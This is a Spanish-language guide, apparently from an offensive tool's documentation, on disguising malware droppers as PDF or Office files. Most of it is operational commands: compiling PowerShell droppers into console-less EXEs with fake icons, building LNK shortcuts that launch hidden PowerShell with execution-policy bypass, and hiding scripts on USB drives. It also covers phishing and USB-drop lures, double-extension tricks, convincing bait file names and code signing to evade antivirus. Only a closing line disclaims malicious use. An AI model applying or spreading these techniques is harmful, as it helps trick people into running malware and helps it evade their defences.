# 🎭 Guía: Droppers con Icono

## ❓ El Problema

Los scripts `.bat` y `.ps1` **NO pueden tener icono** porque son texto plano, no binarios.

## ✅ Soluciones

### **Opción 1: Compilar a EXE** (Recomendado)

```bash
# 1. Compilar dropper PowerShell a EXE con icono
python compile_dropper.py simple_dropper.ps1 -o document.exe -i pdf_icon.ico --noconsole

# 2. Resultado: document.exe con icono PDF
```

**Ventajas**:
- ✅ Tiene icono real
- ✅ Más difícil de analizar
- ✅ Sin consola (modo stealth)

**Desventajas**:
- ❌ Archivo más grande (~2-5 MB)

---

### **Opción 2: LNK con Icono** (Más Sigiloso)

```bash
# 1. Crear LNK que ejecuta el dropper
python generate_lnk.py \
    --target "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --args "-WindowStyle Hidden -ExecutionPolicy Bypass -File dropper.ps1" \
    --icon pdf_icon.ico \
    --output document.lnk

# 2. Resultado: document.lnk con icono PDF (2 KB)
```

**Ventajas**:
- ✅ Archivo muy pequeño (~2 KB)
- ✅ Menos sospechoso
- ✅ Script original oculto

**Desventajas**:
- ⚠️ Se ve como "acceso directo" en algunos casos

---

## 🚀 Flujo Completo

### Ejemplo: Dropper disfrazado de PDF

```bash
# Paso 1: Crear dropper PowerShell
python builder.py --agent agent.exe --output dropper.ps1 --type ps1

# Paso 2: Compilar a EXE con icono PDF
python compile_dropper.py dropper.ps1 -o "Factura_2025.exe" -i pdf_icon.ico --noconsole

# Paso 3: Verificar
ls -lh Factura_2025.exe
```

### Ejemplo: LNK para USB drop

```bash
# Paso 1: Crear dropper simple
python builder.py --agent payload.exe --output dropper.ps1 --type ps1

# Paso 2: Crear LNK con icono
python generate_lnk.py \
    --target "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \
    --args "-w hidden -ep bypass -f dropper.ps1" \
    --icon pdf_icon.ico \
    --output "IMPORTANTE_LEER.lnk"

# Paso 3: Copiar ambos a USB
#   - IMPORTANTE_LEER.lnk (visible, con icono)
#   - dropper.ps1 (oculto)
```

---

## 📊 Comparación de Métodos

| Método | Tamaño | Icono | Evasión | Complejidad |
|--------|--------|-------|---------|-------------|
| `.bat` script | <1 KB | ❌ | Baja | Baja |
| `.ps1` script | <5 KB | ❌ | Media | Baja |
| `.exe` compilado | 2-5 MB | ✅ | Alta | Media |
| `.lnk` + script | ~2 KB | ✅ | Media | Media |
| `.hta` | <10 KB | ✅ | Baja | Alta |

---

## 🎯 Recomendaciones por Escenario

### Phishing Email
```bash
# EXE con icono + nombre convincente
python compile_dropper.py dropper.ps1 -o "Factura_12345.pdf.exe" -i pdf_icon.ico --noconsole
```

### USB Drop
```bash
# LNK pequeño + script oculto
python generate_lnk.py --target powershell.exe --args "-w hidden -f .dropper.ps1" \
    --icon pdf_icon.ico --output "README.lnk"

# Ocultar script: attrib +h .dropper.ps1
```

### Red Team
```bash
# EXE ofuscado con icono corporativo
python compile_dropper.py advanced_dropper.ps1 -o "Company_Tool.exe" \
    -i company_logo.ico --noconsole
```

---

## 🔧 Herramientas Necesarias

```bash
# Para compilar PowerShell
Install-Module ps2exe -Scope CurrentUser

# Para compilar Batch
pip install pyinstaller

# Para iconos
pip install Pillow requests
```

---

## 💡 Tips

### Doble Extensión
```bash
# Windows oculta extensiones conocidas
# "Factura.pdf.exe" se ve como "Factura.pdf"
python compile_dropper.py dropper.ps1 -o "Invoice.pdf.exe" -i pdf_icon.ico
```

### Nombres Convincentes
```
✅ Factura_2025_001.exe
✅ Boleta_Pago.exe
✅ Contrato_Firmado.exe
✅ Curriculum_JuanPerez.exe

❌ dropper.exe
❌ payload.exe
❌ agent.exe
```

### Firmar EXE (Opcional)
```bash
# Firma digital reduce detección AV
signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com document.exe
```

---

## 🎨 Iconos Disponibles

```bash
# Generar icono desde imagen
python add_icon.py dummy.exe --icon logo.png --convert

# Descargar iconos predefinidos
python add_icon.py dummy.exe --download pdf    # PDF
python add_icon.py dummy.exe --download word   # Word
python add_icon.py dummy.exe --download excel  # Excel
python add_icon.py dummy.exe --download zip    # ZIP
```

---

## ⚠️ Nota Legal

Esta herramienta es para educación y red team autorizado. Uso malicioso es ilegal.
